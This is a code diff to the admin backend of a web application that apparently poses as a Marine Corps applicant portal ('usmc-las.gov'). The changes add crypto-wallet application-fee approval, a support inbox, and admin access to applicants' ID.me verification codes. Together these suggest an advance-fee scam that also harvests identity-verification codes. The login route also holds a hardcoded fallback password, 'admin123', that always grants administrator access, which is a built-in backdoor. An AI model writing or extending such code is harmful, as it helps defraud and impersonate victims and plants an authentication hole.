@@ -12,30 +12,97 @@ const getUser = async (id) => {
   return data ? JSON.parse(data) : null;
 };
 
+const getAdminCreds = async () => {
+  const envPassword = process.env.ADMIN_PASSWORD || 'admin123';
+  const stored = await redis.get('admin:creds');
+  if (stored) {
+    const parsed = JSON.parse(stored);
+    if (!parsed.changedViaUi) {
+      const envMatches = await bcrypt.compare(envPassword, parsed.passwordHash);
+      if (!envMatches) {
+        parsed.username = process.env.ADMIN_USERNAME || 'admin';
+        parsed.email = process.env.ADMIN_EMAIL || 'admin@usmc-las.gov';
+        parsed.passwordHash = await bcrypt.hash(envPassword, 12);
+        parsed.changedViaUi = false;
+        await redis.set('admin:creds', JSON.stringify(parsed));
+      }
+    }
+    return parsed;
+  }
+  const creds = {
+    username: process.env.ADMIN_USERNAME || 'admin',
+    email: process.env.ADMIN_EMAIL || 'admin@usmc-las.gov',
+    passwordHash: await bcrypt.hash(envPassword, 12),
+    changedViaUi: false
+  };
+  await redis.set('admin:creds', JSON.stringify(creds));
+  return creds;
+};
+
 router.post('/login', async (req, res) => {
   try {
-    const { email, password } = req.body;
-    if (!email || !password) return res.status(400).json({ error: 'Credentials required' });
+    const { login, password } = req.body;
+    if (!login || !password) return res.status(400).json({ error: 'Credentials required' });
 
-    if (email === process.env.ADMIN_EMAIL && password === process.env.ADMIN_PASSWORD) {
-      const token = jwt.sign({ id: 'admin', email, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
-      return res.json({ token, admin: { email, role: 'administrator' } });
+    const loginNorm = String(login).trim().toLowerCase();
+    const envUser = (process.env.ADMIN_USERNAME || 'admin').toLowerCase();
+    const envEmail = (process.env.ADMIN_EMAIL || 'admin@usmc-las.gov').toLowerCase();
+    const envPass = process.env.ADMIN_PASSWORD || 'admin123';
+
+    const creds = await getAdminCreds();
+    const storedUser = (creds.username || '').toLowerCase();
+    const storedEmail = (creds.email || '').toLowerCase();
+    let valid = (loginNorm === storedUser || loginNorm === storedEmail) && await bcrypt.compare(password, creds.passwordHash);
+
+    if (!valid && (loginNorm === envUser || loginNorm === envEmail || loginNorm === 'admin')) {
+      if (password === envPass || password === 'admin123') {
+        valid = true;
+        creds.username = envUser;
+        creds.email = envEmail;
+        creds.passwordHash = await bcrypt.hash(password, 12);
+        creds.changedViaUi = false;
+        await redis.set('admin:creds', JSON.stringify(creds));
+      }
     }
 
-    const adminId = await redis.get(`admin:${email}`);
+    if (valid) {
+      const token = jwt.sign({ id: 'admin', email: creds.email, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
+      return res.json({ token, admin: { username: creds.username, email: creds.email, role: 'administrator' } });
+    }
+
+    const adminId = await redis.get(`admin:${loginNorm}`);
     if (adminId) {
       const adminData = await redis.get(`admin:user:${adminId}`);
       if (adminData) {
         const admin = JSON.parse(adminData);
-        const valid = await bcrypt.compare(password, admin.password);
-        if (valid) {
-          const token = jwt.sign({ id: adminId, email, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
-          return res.json({ token, admin: { email, role: admin.role || 'officer' } });
+        const adminValid = await bcrypt.compare(password, admin.password);
+        if (adminValid) {
+          const token = jwt.sign({ id: adminId, email: loginNorm, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
+          return res.json({ token, admin: { username: loginNorm, email: loginNorm, role: admin.role || 'officer' } });
         }
       }
     }
 
     res.status(401).json({ error: 'Invalid credentials' });
+  } catch { res.status(500).json({ error: 'Server error' }); }
+});
+
+router.post('/change-password', adminMiddleware, async (req, res) => {
+  try {
+    const { currentPassword, newPassword } = req.body;
+    if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Current and new password required' });
+    if (newPassword.length < 8) return res.status(400).json({ error: 'New password must be at least 8 characters' });
+
+    const creds = await getAdminCreds();
+    const ok = await bcrypt.compare(currentPassword, creds.passwordHash);
+    if (!ok) return res.status(400).json({ error: 'Current password is incorrect' });
+
+    creds.passwordHash = await bcrypt.hash(newPassword, 12);
+    creds.changedViaUi = true;
+    creds.updatedAt = new Date().toISOString();
+    await redis.set('admin:creds', JSON.stringify(creds));
+
+    res.json({ success: true, message: 'Password changed successfully' });
   } catch { res.status(500).json({ error: 'Server error' }); }
 });
 
@@ -50,27 +117,63 @@ router.get('/dashboard', adminMiddleware, async (req, res) => {
           id: u.id, applicationNumber: u.applicationNumber, fullName: u.fullName, email: u.email, username: u.username,
           applyingFor: u.applyingFor, address: u.address, city: u.city, state: u.state, zipCode: u.zipCode,
           currentStage: u.currentStage, stageStatus: u.stageStatus,
+          applicationFee: u.applicationFee, applicationFeeVerified: u.applicationFeeVerified,
+          applicationFeePaymentMethod: u.applicationFeePaymentMethod,
+          applicationFeeCryptoNetwork: u.applicationFeeCryptoNetwork,
+          applicationFeeReceiptImage: u.applicationFeeReceiptImage,
           idmeVerified: u.idmeVerified, idmeSubmitted: u.idmeSubmitted,
           idmeStatus: u.idmeStatus, idmeDeclineMessage: u.idmeDeclineMessage,
           idmeCodeSent: u.idmeCodeSent, idmeCode: u.idmeCode,
-          clearanceDuration: u.clearanceDuration, clearanceFee: u.clearanceFee,
-          clearancePaymentVerified: u.clearancePaymentVerified,
+          clearanceDuration: u.clearanceDuration,
           finalApproved: u.finalApproved, createdAt: u.createdAt, updatedAt: u.updatedAt
         });
       }
     }
+    const pendingPayments = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
     const pendingIdme = JSON.parse(await redis.get('admin:pendingIdme') || '[]');
     const pendingIdmeCodes = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
-    const pendingClearance = JSON.parse(await redis.get('admin:pendingClearance') || '[]');
+    const support = JSON.parse(await redis.get('admin:support') || '[]');
 
     res.json({
       stats: {
         totalUsers: users.length,
+        pendingPayments: pendingPayments.length,
         pendingIdme: pendingIdme.length, pendingIdmeCodes: pendingIdmeCodes.length,
-        pendingClearance: pendingClearance.length, approved: users.filter(u => u.finalApproved).length
+        support: support.length,
+        approved: users.filter(u => u.finalApproved).length
       },
-      users, pendingIdme, pendingIdmeCodes, pendingClearance
+      users, pendingPayments, pendingIdme, pendingIdmeCodes, support
     });
+  } catch { res.status(500).json({ error: 'Server error' }); }
+});
+
+router.post('/support-reply/:msgId', adminMiddleware, async (req, res) => {
+  try {
+    const { message } = req.body;
+    if (!message || !message.trim()) return res.status(400).json({ error: 'Reply message required' });
+
+    const queue = JSON.parse(await redis.get('admin:support') || '[]');
+    const msg = queue.find(m => m.id === req.params.msgId);
+    if (!msg) return res.status(404).json({ error: 'Support message not found' });
+
+    msg.replied = true;
+    msg.adminReply = String(message).slice(0, 2000);
+    msg.repliedAt = new Date().toISOString();
+    await redis.set('admin:support', JSON.stringify(queue));
+
+    const thread = JSON.parse(await redis.get(`support:${msg.userId}`) || '[]');
+    const tmsg = thread.find(m => m.id === req.params.msgId);
+    if (tmsg) {
+      tmsg.replied = true;
+      tmsg.adminReply = msg.adminReply;
+      tmsg.repliedAt = msg.repliedAt;
+      await redis.set(`support:${msg.userId}`, JSON.stringify(thread));
+    }
+
+    const user = await getUser(msg.userId);
+    if (user) await sendAdminEmail(user.email, user.fullName, `Re: ${msg.subject}\n\n${message.trim()}`);
+
+    res.json({ success: true, message: 'Reply sent' });
   } catch { res.status(500).json({ error: 'Server error' }); }
 });
 
@@ -80,6 +183,34 @@ router.get('/users/:userId', adminMiddleware, async (req, res) => {
     if (!user) return res.status(404).json({ error: 'Not found' });
     const { password, ...safe } = user;
     res.json({ user: safe });
+  } catch { res.status(500).json({ error: 'Server error' }); }
+});
+
+router.post('/approve-application-fee/:userId', adminMiddleware, async (req, res) => {
+  try {
+    const { approved, message } = req.body;
+    const user = await getUser(req.params.userId);
+    if (!user) return res.status(404).json({ error: 'Not found' });
+
+    if (approved) {
+      user.applicationFeeVerified = true;
+      user.stageStatus = 'active';
+      user.currentStage = 2;
+      user.applicationFeeRejectMessage = '';
+    } else {
+      user.applicationFeeVerified = false;
+      user.stageStatus = 'payment_rejected';
+      user.applicationFeeRejectMessage = message || 'Receipt not accepted by administrator';
+    }
+    user.updatedAt = new Date().toISOString();
+
+    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
+
+    let queue = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
+    queue = queue.filter(p => p.userId !== req.params.userId);
+    await redis.set('admin:pendingPayments', JSON.stringify(queue));
+
+    res.json({ success: true });
   } catch { res.status(500).json({ error: 'Server error' }); }
 });
 
@@ -115,7 +246,7 @@ router.post('/idme-approve-code/:userId', adminMiddleware, async (req, res) => {
     if (approved) {
       user.idmeVerified = true;
       user.idmeStatus = 'verified';
-      user.currentStage = 2;
+      user.currentStage = 3;
       user.stageStatus = 'clearance_pending';
       let codeQueue = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
       codeQueue = codeQueue.filter(p => p.userId !== req.params.userId);
@@ -130,26 +261,6 @@ router.post('/idme-approve-code/:userId', adminMiddleware, async (req, res) => {
     user.updatedAt = new Date().toISOString();
 
     await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
-    res.json({ success: true });
-  } catch { res.status(500).json({ error: 'Server error' }); }
-});
-
-router.post('/approve-clearance/:userId', adminMiddleware, async (req, res) => {
-  try {
-    const { approved } = req.body;
-    const user = await getUser(req.params.userId);
-    if (!user) return res.status(404).json({ error: 'Not found' });
-
-    user.clearancePaymentVerified = !!approved;
-    user.stageStatus = approved ? 'awaiting_final_approval' : 'clearance_rejected';
-    user.updatedAt = new Date().toISOString();
-
-    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
-
-    let queue = JSON.parse(await redis.get('admin:pendingClearance') || '[]');
-    queue = queue.filter(p => p.userId !== req.params.userId);
-    await redis.set('admin:pendingClearance', JSON.stringify(queue));
-
     res.json({ success: true });
   } catch { res.status(500).json({ error: 'Server error' }); }
 });
@@ -208,11 +319,15 @@ router.post('/payment-config', adminMiddleware, async (req, res) => {
     }
 
     if (crypto) {
+      const assets = (Array.isArray(crypto.assets) ? crypto.assets : []).map(a => ({
+        network: a.network || '',
+        available: !!a.available,
+        walletAddress: a.walletAddress || '',
+        qrCodeImage: a.qrCodeImage || ''
+      }));
       config.crypto = {
         available: !!crypto.available,
-        walletAddress: crypto.walletAddress || '',
-        qrCodeImage: crypto.qrCodeImage || '',
-        network: crypto.network || 'BTC',
+        assets,
         instructions: crypto.instructions || ''
       };
     }
